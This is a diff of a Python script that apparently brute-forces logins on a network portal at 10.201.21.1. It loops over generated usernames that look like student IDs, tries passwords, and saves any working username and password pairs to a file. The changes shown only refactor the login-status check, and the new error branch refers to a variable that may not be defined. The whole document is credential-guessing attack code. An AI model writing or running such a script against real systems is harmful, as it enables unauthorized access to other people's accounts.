@@ -6,7 +6,7 @@ usernames = []
 for i in range(0,100):
     usernames.append("23TSFBA"+f'{i:03}')
 
-def logged_in(password_str=-1):
+def logged_in():
     status_response = requests.get(base_url, allow_redirects=False)
 
     if status_response.status_code == 302:
@@ -16,12 +16,12 @@ def logged_in(password_str=-1):
         elif redirect_url==base_url+"/login":
             # print()
             return False
-        else:
-            final_response = requests.get(redirect_url)
-            print("something is wrong!")
-            print(redirect_url)
-            print(final_response.headers)
-            return None
+    else:
+        final_response = requests.get(redirect_url)
+        print("something is wrong!")
+        print("status code: ", status_response.status_code)
+        print("headers: ", status_response.headers)
+        return None
 
 def logout():
     logout = requests.get('http://10.201.21.1/logout?')
@@ -94,7 +94,7 @@ for username in usernames:
         }
 
         status_response = requests.get(f'{base_url}/')
-        if logged_in(password_str):
+        if logged_in():
             print(f"Login successful for username: {username}, password: {password_str}")
 
             # Write the username and password to a file
